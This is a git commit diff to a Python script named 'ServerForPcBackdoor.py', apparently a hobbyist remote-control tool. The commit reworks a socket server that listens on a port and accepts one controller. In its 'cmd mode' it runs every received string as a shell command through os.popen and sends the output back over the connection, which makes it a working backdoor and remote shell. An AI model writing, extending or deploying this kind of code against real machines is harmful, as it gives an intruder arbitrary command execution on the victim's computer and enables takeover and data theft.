468e1b60bba7d7d1d533ed77cf325ca53b457426
GTDT <66834354+GTDT@users.noreply.github.com>
2021-01-10 09:42:40 +0200

    The changes that i made.

--- ServerForPcBackdoor.py
+++ ServerForPcBackdoor.py
@@ -1,41 +1,44 @@
 """
-╔═════════════════════════════════════╗
-║─────────────────────────────────────║
-║─────────╔═══╦════╦═══╦════╗─────────║
-║─────────║╔═╗║╔╗╔╗╠╗╔╗║╔╗╔╗║─────────║
-║─────────║║─╚╩╝║║╚╝║║║╠╝║║╚╝─────────║
-║─────────║║╔═╗─║║──║║║║─║║───────────║
-║─────────║╚╩═║─║║─╔╝╚╝║─║║───────────║
-║─────────╚═══╝─╚╝─╚═══╝─╚╝───────────║
-║──╔══╗╔═══╦═══╦╗╔═╦═══╦═══╦═══╦═══╗──║
-║──║╔╗║║╔═╗║╔═╗║║║╔╩╗╔╗║╔═╗║╔═╗║╔═╗║──║
-║──║╚╝╚╣║─║║║─╚╣╚╝╝─║║║║║─║║║─║║╚═╝║──║
-║──║╔═╗║╚═╝║║─╔╣╔╗║─║║║║║─║║║─║║╔╗╔╝──║
-║──║╚═╝║╔═╗║╚═╝║║║╚╦╝╚╝║╚═╝║╚═╝║║║╚╗──║
-║──╚═══╩╝─╚╩═══╩╝╚═╩═══╩═══╩═══╩╝╚═╝──║
-║─────────────────────────────────────║
-╚═════════════════════════════════════╝
+                ╔═══════════════════════════════════════════════════╗
+                ║───────────────────────────────────────────────────║
+                ║────────────────╔═══╦════╦═══╦════╗────────────────║
+                ║────────────────║╔═╗║╔╗╔╗╠╗╔╗║╔╗╔╗║────────────────║
+                ║────────────────║║─╚╩╝║║╚╝║║║╠╝║║╚╝────────────────║
+                ║────────────────║║╔═╗─║║──║║║║─║║──────────────────║
+                ║────────────────║╚╩═║─║║─╔╝╚╝║─║║──────────────────║
+                ║────────────────╚═══╝─╚╝─╚═══╝─╚╝──────────────────║
+                ║────────────╔══╗──────╔╗─╔═══╗─────────────────────║
+                ║────────────║╔╗║──────║║─╚╗╔╗║─────────────────────║
+                ║────────────║╚╝╚╦══╦══╣║╔╗║║║╠══╦══╦═╗─────────────║
+                ║────────────║╔═╗║╔╗║╔═╣╚╝╝║║║║╔╗║╔╗║╔╝─────────────║
+                ║────────────║╚═╝║╔╗║╚═╣╔╗╦╝╚╝║╚╝║╚╝║║──────────────║
+                ║────────────╚═══╩╝╚╩══╩╝╚╩═══╩══╩══╩╝──────────────║
+                ║───────────────────────────────────────────────────║
+                ╚═══════════════════════════════════════════════════╝
 """
 
 
 
-## Importing needed mudules.
-import socket
+## Importing needed modules.
+from time import sleep
+import socket, os
 
 ## Help command text.
 HelpCommand = """\n\n
-	*Avaiable commands:
-	Help / help
-	EXIT
-	Disconnect
-	CmdOn
-	CmdOff
+        *Available commands:
+        Help               |   For help.
+        ServerShutdown     |   For exiting the server script.
+        Disconnect         |   For disconnecting from the server.
+        Cmdon              |   For turning cmd mode on.
+        CmdOff             |   For turning cmd mode off.
+        Cls                |   For clearing terminal.
 """
 
 ## Definition/Function that starts the server.
 def ServerStart():
 	global server, controller
 
+	#IP   Port =     IP       Port
 	Host, Port = 'localhost', 6482
 
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -46,75 +49,81 @@ def ListenAndAcceptConnection():
 	global controller
 	server.listen()
 	controller, address = server.accept()
-	controller.send("\n\n  Server: You just connected to the server!".encode('utf-8'))
+	controller.send(f"\n\n  Server: You just connected to the server!{HelpCommand}".encode('utf-8'))
 
 ## Definition/Function with all the Functionality of the backdoor.
 def Functionality():
 
+	## Cmd Mode is disabled by default.
+	CmdMode = False
+
 	while True:
 
-		## Server Command Reciver.
+		## Server Command Receiver.
 		SCR = controller.recv(2048).decode('utf-8')
 
-		## Cmd Mode is disabled by default.
-		CmdMode = False
-
-		## Help Command.
-		if SCR == "HELP" or SCR == "Help" or SCR == "help":
-			controller.send(HelpCommand.encode('utf-8'))
-			continue
 
 		## Command to turn cmd mode on.
-		if SCR == "CmdOn" or SCR == "CMDON" or SCR == "cmdon" or SCR == "Cmdon" or SCR == "cmdOn":
+		if SCR == "CmdOn" or SCR == "Cmdon" or SCR == "cmdon":
 			CmdMode = True
 			controller.send("\n\n  Server: !! Cmd Mode Is On !!".encode('utf-8'))
 			continue
 
 		## Command to turn cmd mode off.
-		if SCR == "CmdOff" or SCR == "CMDOFF" or SCR == "cmdoff" or SCR == "Cmdoff" or SCR == "cmdOff":
+		elif SCR == "CmdOff" or SCR == "Cmdoff" or SCR == "cmdoff":
 			CmdMode = False
 			controller.send("\n\n  Server: !! Cmd Mode Is Off !!".encode('utf-8'))
 
 		## Command to disconnect the user.
-		if SCR == "DISCONNECT" or SCR == "Disconnect" or SCR == "disconnect":
+		elif SCR == "Disconnect" or SCR == "disconnect":
 			controller.send("\n\n  Server: You just disconnected!".encode('utf-8'))
-			controller.close()
 			ReStart()
 
+		## ServerShutdown command.
+		elif SCR == "ServerShutdown" or SCR == "Servershutdown" or SCR == "servershutdown":
+			controller.send("\n\n  Server: Confirm By Typing: Server_Shutdown_Confirm".encode('utf-8'))
+		
 		## For CMD execution for windows.
-		if CmdMode:
-			CMD = os.system(SCR)
+		elif CmdMode:
+			CMD = os.popen(SCR)
+			CmdOutput = CMD.read()
+			controller.send(CmdOutput.encode('utf-8'))
 
-		## Exit command.
-		if SCR == "SERVERSHUTDOWN" or SCR == "ServerShutdown" or SCR == "Servershutdown" or SCR == "servershutdown" or SCR == "serverShutdown":
-			controller.send("\n\n  Server: Confirm By Typing: Exit_Confirm_True".encode('utf-8'))
-			continue
+		## Help Command.
+		elif SCR == "HELP" or SCR == "Help" or SCR == "help":
+			controller.send(HelpCommand.encode('utf-8'))
 
-		## Exit confirmation that shuts down the server & user script.
-		if SCR == "Shutdown_The_Server_Confirm_True":
-			controller.send("".encode('utf-8'))
-			controller.send("\n\n  Server: You closed server script!".encode('utf-8'))
-			exit()
+		## Command to disconnect the user.
+		elif SCR == "Cls" or SCR == "cls":
+			sleep(0.5)
+			controller.send("\n\n  Server: Console is cleared.".encode('utf-8'))
 
-		## If command is not detected send user that command is unknown.
+		## ServerShutdown confirmation that shuts down the server & user script.
+		elif SCR == "Server_Shutdown_Confirm":
+			controller.send("\n\n  Server: You closed server script!\n\n".encode('utf-8'))
+			controller.close()
+			os._exit(2)
+
+		## Else send user that command is unknown.
 		else:
-			controller.send("\n\n  Server: !!Unknown build in command!!".encode('utf-8'))
+			#controller.send("\n\n  Server: !!Unknown command!!".encode('utf-8'))
+			controller.send(f"\n\n  Invalid command: {SCR}".encode('utf-8'))
+			print(f"\n\n  Invalid command: {SCR}")
 
 ## Definition/Function for starting the server.
 def Start():
 	ServerStart()
 	ListenAndAcceptConnection()
+	Functionality()
 
 ## Definition/Function for restarting the server.
 def ReStart():
+	controller.close()
 	ListenAndAcceptConnection()
 	Functionality()
 
 ## Executing Start Definition/Function to the server.
 Start()
-
-
-
 
 
 
